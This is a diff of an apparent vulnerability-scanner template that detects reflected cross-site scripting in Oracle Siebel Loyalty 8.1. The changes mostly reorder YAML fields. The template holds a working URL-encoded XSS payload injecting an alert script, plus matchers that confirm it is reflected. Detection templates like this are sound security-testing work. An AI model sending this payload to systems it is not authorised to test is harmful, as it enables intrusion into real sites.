@@ -1,5 +1,4 @@
 id: oracle-siebel-xss
-
 info:
   name: Oracle Siebel Loyalty 8.1 - Cross-Site Scripting
   author: dhiyaneshDK
@@ -13,28 +12,23 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-80
   metadata:
     max-request: 1
-  tags: xss,oracle,siebel,packetstorm,edb,vuln
-
+  tags: edb,oracle,packetstorm,siebel,vuln,xss
 http:
-  - method: GET
-    path:
-      - '{{BaseURL}}/loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
-
-    matchers-condition: and
-    matchers:
+  - matchers:
       - type: word
         words:
-          - '</script><script>alert(document.domain)</script>'
-
-      - type: word
-        part: header
+          - </script><script>alert(document.domain)</script>
+      - part: header
+        type: word
         words:
           - text/html
-
-      - type: status
-        status:
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
